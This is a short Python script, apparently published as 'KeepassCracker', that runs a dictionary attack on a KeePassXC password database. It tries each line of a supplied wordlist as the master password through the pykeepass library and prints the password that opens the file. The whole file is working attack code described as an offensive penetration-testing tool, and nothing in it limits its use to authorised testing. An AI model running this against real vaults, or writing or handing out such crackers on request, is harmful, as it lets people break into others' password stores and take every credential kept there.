"""
KeepassCracker
This is an offensive security penetration testing tool to break into KeepassXC databases.

Made by @r4shsec
"""
# Modules | pip install -r requirements.txt
import time
import argparse
import threading
from pykeepass import PyKeePass

parser = argparse.ArgumentParser(description="An offensive security tool to break into KeepassXC databases.")
parser.add_argument("-f", "--file", help="KeePassXC database file.", required=True)
parser.add_argument("-w", "--wordlist", help="Crack the password from a wordlist.", required=True)

args = parser.parse_args()

with open(args.wordlist, "r") as f:
    wordlist = f.read().splitlines()

for password in wordlist:
    try:
        PyKeePass(args.file, password=password)
        print(f"[+] Password found: {password}")
    except Exception as e:
        print(f"[-] Password not found: {password}")